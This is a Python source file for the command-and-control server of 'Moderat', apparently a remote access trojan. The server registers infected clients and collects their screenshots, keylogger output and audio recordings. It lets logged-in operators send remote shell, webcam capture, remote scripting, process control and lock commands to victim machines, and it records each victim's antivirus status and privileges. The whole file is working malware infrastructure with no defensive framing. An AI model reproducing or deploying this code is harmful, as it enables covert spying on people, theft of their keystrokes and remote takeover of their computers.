import logging
from logging.handlers import RotatingFileHandler
import sys
import string
import random
import ast
import os
import datetime

from twisted.internet.protocol import Protocol, ServerFactory
from twisted.internet import reactor

from db.ClientsManagment import ClientsManagment
from db.ModeratorsManagment import ModeratorsManagment
from db.ScreenshotsManager import ScreenshotsManager
from db.KeyloggerManager import KeyloggerManager
from db.AudioManagment import AudioManager
from factory.PhotoFactory import save_image
from factory.KeyFactory import html_generator
from factory.AudioFactory import wav_generator

LOGFILE = 'server.log'
CLIENTS_PORT = 4434
MODERATORS_PORT = 1313
DATA_STORAGE = r'C:\DATA'

# Initialize logger
log = logging.getLogger('')
log.setLevel(logging.DEBUG)
format = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")

ch = logging.StreamHandler(sys.stdout)
ch.setFormatter(format)
log.addHandler(ch)

fh = logging.handlers.RotatingFileHandler(LOGFILE, maxBytes=(1048576*5), backupCount=7)
fh.setFormatter(format)
log.addHandler(fh)

manageClients = ClientsManagment()
manageModerators = ModeratorsManagment()
manageScreenshots = ScreenshotsManager()
manageKeylogs = KeyloggerManager()
manageAudio = AudioManager()

# Clear Clients Status
manageClients.set_status_zero()


def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

clients = {}
moderators = {}


class ModeratServerProtocol(Protocol):

    def __init__(self):

        self.__buffer__ = ''

        # dicts for download
        self.screenshots_dict = {}
        self.keylogs_dict = {}
        self.audio_dict = {}

    # New Connection Made
    def connectionMade(self):
        self.send_message_to_client(self, 'connectSuccess', 'connectSuccess')

    def connectionLost(self, reason):
        global clients

        # Delete Socket Entry
        try:
            for key, value in clients.items():
                if value['socket'] == self:
                    # Set Client Offline
                    manageClients.set_client_offline(value['key'])
                    log.info('Client (%s) Disconnected' % value['key'])
                    del clients[key]
        except KeyError:
            pass

        # Delete Moderator Entry
        try:
            for key, value in moderators.items():
                if value['socket'] == self:
                    # Set Moderator Offline
                    manageModerators.set_status(value['username'], 0)
                    log.info('Moderator (%s) Disconnected' % value['username'])
                    del moderators[key]
        except KeyError:
            pass

    def dataReceived(self, data, end='[ENDOFMESSAGE]'):
        # Data Received
        self.__buffer__ += data
        if self.__buffer__.endswith(end):

            all_data = self.__buffer__[:-len(end)]
            if end in all_data:
                all_data = all_data.split(end)[-1]
            self.__buffer__ = ''
            command = ast.literal_eval(all_data)

            # Switch to client commands
            if command['from'] == 'client':
                self.client_commands(command['payload'], command['mode'], command['session_id'], command['key'])
            # Switch to moderator commands
            elif command['from'] == 'moderator':
                self.moderator_commands(command)



    def client_commands(self, payload, mode, session_id, key):

        # Clients Initializing
        if mode == 'clientInitializing':

            log.info('Get Key If Exists Or Generate New One')

            # If client has no key generate new one and send
            if payload == 'noKey':
                log.info('Generate New Key')
                client_id = id_generator()

                self.send_message_to_client(self, client_id, 'clientInitializing')

            # else get key from client
            else:
                client_id = payload

            clients[client_id] = {
                'socket': self,
                'status': False,
            }

            log.info('[*] New Client from %s' % self.transport.getHost())

            # Create Client DB Entry
            manageClients.create_client('admin', client_id, self.transport.getHost().host)
            manageClients.set_client_online(client_id)

        # Clients Status Checker
        elif mode == 'infoChecker' and clients.has_key(payload['key']):
            client_socket = clients[payload['key']]['socket']
            clients[payload['key']] = {
                'ip_address':           self.transport.getHost().host,
                'os_type':              payload['os_type'],
                'os':                   payload['os'],
                'protection':           payload['protection'],
                'user':                 payload['user'],
                'privileges':           payload['privileges'],
                'audio_device':         payload['audio_device'],
                'webcamera_device':     payload['webcamera_device'],
                'window_title':         payload['window_title'],
                'key':                  payload['key'],
                'socket':               client_socket,
            }

        # Data Logger
        elif mode == 'screenshotLogs':
            screen_info = ast.literal_eval(payload)
            screen_path, name, window_title, date = save_image(screen_info, key, DATA_STORAGE)
            manageScreenshots.save_image(key, name, screen_path, window_title, date)
            log.info('Screenshot Saved (%s)' % key)

        elif mode == 'keyloggerLogs':
            keylogger_info = ast.literal_eval(payload)
            html_path, datetime_stamp = html_generator(key, keylogger_info, DATA_STORAGE)
            manageKeylogs.save_keylog(key, datetime_stamp, html_path)
            log.info('Keylogs Saved (%s)' % key)

        elif mode == 'audioLogs':
            audio_info = ast.literal_eval(payload)
            wav_path, datetime_stamp = wav_generator(key, audio_info, DATA_STORAGE)
            manageAudio.save_audio(key, datetime_stamp, wav_path)
            log.info('Audio Saved (%s)' % key)

        elif moderators.has_key(session_id):
            log.info('Send Data to Moderator (%s)' % moderators[session_id]['username'])
            self.send_message_to_moderator(moderators[session_id]['socket'], payload, mode)

        else:
            return

    def moderator_commands(self, data):

        if data['mode'] == 'moderatorInitializing':

            # Initializing Moderator
            log.info('Initializing Moderator')
            if data['payload'].startswith('auth '):
                if len(data['payload'].split()) == 3:
                    command, username, password = data['payload'].split()

                    # If Login Success
                    if manageModerators.login_user(username, password):

                        privileges = manageModerators.get_privs(username)

                        log.info('Moderator (%s) Login Success' % username)
                        self.send_message_to_moderator(self, 'loginSuccess %s' % privileges, 'moderatorInitializing')

                        # Create Session For Moderator and Save
                        log.info('Create Session for Moderator (%s)' % data['session_id'])
                        moderators[data['session_id']] = {'username': username, 'socket': self}

                        # Set Moderator Last Online
                        manageModerators.set_last_online(username, datetime.datetime.now())
                        # Set Moderator Online Status
                        manageModerators.set_status(username, 1)

                    # if Login Not Success
                    else:
                        log.warning('Moderator (%s) Login Error' % username)
                        self.send_message_to_moderator(self, 'loginError', 'moderatorInitializing')

        # Check if session id is active
        elif data['mode'] == 'getClients' and data['session_id'] in moderators:

            if self.is_administrator(data['session_id']):
                clients_ids = manageClients.get_all_clients()
            else:
                clients_ids = manageClients.get_clients(moderators[data['session_id']]['username'])
            shared_clients = {}

            # for online clients
            for client_id in clients_ids:
                _id = client_id[0]
                # Online Clients
                if clients.has_key(_id) and clients[_id].has_key('os_type'):
                    shared_clients[_id] = {
                        'moderator':            manageClients.get_moderator(_id),
                        'alias':                manageClients.get_alias(_id),
                        'ip_address':           self.transport.getHost().host,
                        'os_type':              clients[_id]['os_type'],
                        'os':                   clients[_id]['os'],
                        'protection':           clients[_id]['protection'],
                        'user':                 clients[_id]['user'],
                        'privileges':           clients[_id]['privileges'],
                        'audio_device':         clients[_id]['audio_device'],
                        'webcamera_device':     clients[_id]['webcamera_device'],
                        'window_title':         clients[_id]['window_title'],
                        'key':                  clients[_id]['key'],
                        'status':               True
                    }
                # Offline Clients
                else:
                    shared_clients[client_id] = {
                        'moderator':    manageClients.get_moderator(_id),
                        'key':           _id,
                        'alias':        manageClients.get_alias(_id),
                        'ip_address':   manageClients.get_ip_address(_id),
                        'last_online':  manageClients.get_last_online(_id),
                        'status':       False
                    }

            self.send_message_to_moderator(self, shared_clients, 'getClients')

        # Set Alias For Client
        elif data['mode'] == 'setAlias':
            alias_client, alias_value = data['payload'].split()
            log.info('Set Alias %s For %s' % (alias_value, data['mode']))
            manageClients.set_alias(alias_client, alias_value)

        elif data['mode'] == 'countScreenshots':
            client_id, date = data['payload'].split()
            not_downloaded = manageScreenshots.get_screenshots_count_0(client_id, date)
            downloaded = manageScreenshots.get_screenshots_count_1(client_id, date)
            self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countScreenshots')
            log.info('Screenshots Count Sent to Moderator')

        elif data['mode'] == 'countKeylogs':
            client_id, date = data['payload'].split()
            not_downloaded = manageKeylogs.get_keylogs_count_0(client_id, date)
            downloaded = manageKeylogs.get_keylogs_count_1(client_id, date)
            self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countKeylogs')
            log.info('Keylogs Count Sent to Moderator')

        elif data['mode'] == 'countAudios':
            client_id, date = data['payload'].split()
            not_downloaded = manageAudio.get_audios_count_0(client_id, date)
            downloaded = manageAudio.get_audios_count_1(client_id, date)
            self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countAudios')
            log.info('Audios Count Sent to Moderator')

        # TODO: Download Screenshots
        elif data['mode'] == 'downloadScreenshots':
            client_id, date, filter_downloaded = data['payload'].split()
            if int(filter_downloaded) == 1:
                screenshots_list = manageScreenshots.get_all_new_screenshots(client_id, date)
            else:
                screenshots_list = manageScreenshots.get_all_screenshots(client_id, date)
            if len(screenshots_list) > 0:
                screenshots_names = []
                for screenshot in screenshots_list:
                    if os.path.exists(screenshot[2]):
                        self.screenshots_dict[screenshot[1]] = {}
                        self.screenshots_dict[screenshot[1]]['datetime'] = screenshot[1]
                        self.screenshots_dict[screenshot[1]]['raw'] = open(screenshot[2], 'rb').read()
                        self.screenshots_dict[screenshot[1]]['window_title'] = screenshot[3]
                        self.screenshots_dict[screenshot[1]]['date'] = screenshot[4]
                        screenshots_names.append(screenshot[1])
                    else:
                        log.info('File Not Found Delete Entry (%s)' % screenshot[2])
                        manageScreenshots.delete_screenshot(screenshot[1])
                # Send Data Count
                self.send_message_to_moderator(self, screenshots_names, len(screenshots_list))
            else:
                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')

        elif data['mode'] == 'downloadScreenshot':
            screenshot_name = data['payload']
            if self.screenshots_dict.has_key(screenshot_name):
                self.send_message_to_moderator(self, self.screenshots_dict[screenshot_name], 'downloadScreenshot')
                manageScreenshots.set_screenshot_viewed(self.screenshots_dict[screenshot_name]['datetime'])
                del self.screenshots_dict[screenshot_name]
            else:
                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')

        # TODO: Download Keylogs
        elif data['mode'] == 'downloadKeylogs':
            client_id, date, filter_downloaded = data['payload'].split()
            if int(filter_downloaded) == 1:
                keylogs_list = manageKeylogs.get_all_new_keylogs(client_id, date)
            else:
                keylogs_list = manageKeylogs.get_all_keylogs(client_id, date)
            if len(keylogs_list) > 0:
                keylogs_names = []
                for keylog in keylogs_list:
                    if os.path.exists(keylog[3]):
                        self.keylogs_dict[keylog[1]] = {}
                        self.keylogs_dict[keylog[1]]['datetime'] = keylog[1]
                        self.keylogs_dict[keylog[1]]['date'] = keylog[2]
                        self.keylogs_dict[keylog[1]]['raw'] = open(keylog[3], 'rb').read()
                        keylogs_names.append(keylog[1])
                    else:
                        log.info('File Not Found Delete Entry (%s)' % keylog[3])
                        manageKeylogs.delete_keylog(keylog[1])
                # Send Data Count
                self.send_message_to_moderator(self, keylogs_names, len(keylogs_list))
            else:
                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')

        elif data['mode'] == 'downloadKeylog':
            keylog_name = data['payload']
            if self.keylogs_dict.has_key(keylog_name):
                self.send_message_to_moderator(self, self.keylogs_dict[keylog_name], 'downloadKeylog')
                manageKeylogs.set_keylog_viewed(self.keylogs_dict[keylog_name]['datetime'])
                del self.keylogs_dict[keylog_name]
            else:
                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')

        # TODO: Download Audios
        elif data['mode'] == 'downloadAudios':
            client_id, date, filter_downloaded = data['payload'].split()
            if int(filter_downloaded) == 1:
                audios_list = manageAudio.get_all_new_audios(client_id, date)
            else:
                audios_list = manageAudio.get_all_audios(client_id, date)
            if len(audios_list) > 0:
                audios_names = []
                for audio in audios_list:
                    if os.path.exists(audio[3]):
                        self.audio_dict[audio[1]] = {}
                        self.keylogs_dict[audio[1]]['datetime'] = audio[1]
                        self.keylogs_dict[audio[1]]['date'] = audio[2]
                        self.keylogs_dict[audio[1]]['raw'] = open(audio[3], 'rb').read()
                        audios_names.append(audio[1])
                    else:
                        log.info('File Not Found Delete Entry (%s)' % audio[3])
                        manageKeylogs.delete_keylog(audio[1])
                # Send Data Count
                self.send_message_to_moderator(self, audios_names, len(audios_list))
            else:
                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')

        elif data['mode'] == 'downloadAudio':
            audio_name = data['payload']
            if self.audio_dict.has_key(audio_name):
                self.send_message_to_moderator(self, self.audio_dict[audio_name], 'downloadKeylog')
                manageAudio.set_audio_viewed(self.audio_dict[audio_name]['datetime'])
                del self.keylogs_dict[audio_name]
            else:
                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')

        # ADMIN PRIVILEGES
        # Get Moderators List
        elif data['mode'] == 'getModerators' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
            all_moderators = manageModerators.get_moderators()
            result = {}
            for moderator in all_moderators:
                all_clients_count = len(ClientsManagment().get_clients(moderator[0]))
                offline_clients_count = len(ClientsManagment().get_offline_clients(moderator[0]))
                result[moderator[0]] = {
                    'privileges': moderator[2],
                    'offline_clients': offline_clients_count,
                    'online_clients': all_clients_count - offline_clients_count,
                    'status': moderator[3],
                    'last_online': moderator[4],
                }
            self.send_message_to_moderator(self, result, 'getModerators')

        # Add Moderator
        elif data['mode'] == 'addModerator' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
            username, password, privileges = data['payload'].split()
            manageModerators.create_user(username, password, int(privileges))

        elif data['mode'] == 'setModerator' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
            client_id, moderator_id = data['payload'].split()
            manageClients.set_moderator(client_id, moderator_id)
            log.info('Moderator Changed For Client (%s) to (%s)' % (client_id, moderator_id))


        # Filters
        # Terminating Client
        elif data['mode'] == 'terminateClient' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
        # Unlock Client
        elif data['mode'] == 'unlockClient':
            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
        # Lock Client
        elif data['mode'] == 'lockClient':
            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
        # Desktop Screenshot
        elif data['mode'] == 'getScreen':
            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
        # Webcamera
        elif data['mode'] == 'getWebcam':
            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
        # Remote Shell
        elif data['mode'] == 'shellMode':
            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
        # Processes Manager
        elif data['mode'] == 'proccessMode':
            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
        # Remote Scripting
        elif data['mode'] == 'scriptingMode':
            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])

        else:
            return

    def is_administrator(self, session_id):
        if manageModerators.get_privs(moderators[session_id]['username']) == 1:
            return True
        else:
            return False

    def send_message_to_client(self, client, message, mode, _from='server', session_id='', end='[ENDOFMESSAGE]'):
        # Send Data Function
        message = {
            'payload': message,
            'mode': mode,
            'from': _from,
            'session_id': session_id,
        }
        client.transport.write(str(message)+end)

    def send_message_to_moderator(self, moderator, message, mode, _from='server', end='[ENDOFMESSAGE]'):
        message = {
            'payload': message,
            'mode': mode,
            'from': _from,
            'to': '',
        }
        moderator.transport.write(str(message)+end)


class ModeratServerFactory(ServerFactory):

    log.info('Moderat Server Started')

    protocol = ModeratServerProtocol

    def __init__(self):
        pass


reactor.listenTCP(CLIENTS_PORT, ModeratServerFactory())
log.info('Set Clients Port to %s' % str(CLIENTS_PORT))
reactor.listenTCP(MODERATORS_PORT, ModeratServerFactory())
log.info('Set Moderators Port to %s' % str(MODERATORS_PORT))
reactor.run()